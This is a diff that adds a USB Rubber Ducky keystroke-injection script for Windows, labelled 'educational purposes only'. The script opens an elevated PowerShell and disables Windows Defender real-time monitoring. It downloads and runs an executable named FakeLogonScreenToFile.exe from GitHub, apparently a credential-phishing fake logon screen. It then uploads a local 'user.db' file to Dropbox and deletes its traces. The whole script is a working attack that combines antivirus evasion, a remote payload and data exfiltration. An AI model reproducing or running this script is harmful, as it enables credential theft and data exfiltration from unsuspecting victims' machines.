@@ -1,0 +1,87 @@
+DELAY 500
+REM Ducky Script to download and run files, and set one to run at startup once
+REM Educational purposes only, do not use without permission
+
+DELAY 300
+REM Minimize all windows
+WINDOWS d
+DELAY 300
+
+REM Open PowerShell with admin privileges
+WINDOWS r
+DELAY 300
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 800
+
+STRING Set-Location "$($env:UserProfile)"
+ENTER
+
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 100
+
+REM Open Notepad in PowerShell
+STRING notepad
+ENTER
+DELAY 1500
+REM Type the script
+STRING function DropBox-Upload {
+ENTER
+STRING [CmdletBinding()]
+ENTER
+STRING param (
+ENTER
+STRING [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
+ENTER
+STRING [Alias('f')]
+ENTER
+STRING [string]$SourceFilePath
+ENTER
+STRING )
+ENTER
+STRING $DropBoxAccessToken = 'YOUR_ACCESS_TOKEN_HERE'
+ENTER
+STRING $outputFile = Split-Path $SourceFilePath -leaf
+ENTER
+STRING $TargetFilePath="/$outputFile"
+ENTER
+STRING $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+ENTER
+STRING $authorization = "Bearer " + $DropBoxAccessToken
+ENTER
+STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+ENTER
+STRING $headers.Add("Authorization", $authorization)
+ENTER
+STRING $headers.Add("Dropbox-API-Arg", $arg)
+ENTER
+STRING $headers.Add("Content-Type", 'application/octet-stream')
+ENTER
+STRING Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+ENTER
+STRING }
+DELAY 100
+STRING $localAppDataPath = [Environment]::GetFolderPath("LocalApplicationData")
+ENTER
+STRING $userDbPath = Join-Path -Path $localAppDataPath -ChildPath "Microsoft\user.db"
+ENTER
+STRING $userDbPath | DropBox-Upload
+REM Save the script to script.ps1
+DELAY 1000
+CTRL s
+DELAY 500
+STRING %USERPROFILE%\script.ps1
+ENTER
+DELAY 500
+REM Close Notepad
+ALT f
+DELAY 500
+STRING x
+DELAY 500
+
+REM Download and execute the .exe file
+STRING powershell -w h$url = 'https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/blob/main/FakeLogonScreenToFile.exe?raw=true'; $output = 'C:\Windows\Temp\your_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait; ./script.ps1 -Wait; Remove-Item './script.ps1'; Set-MpPreference -DisableRealtimeMonitoring $false; exit
+ENTER
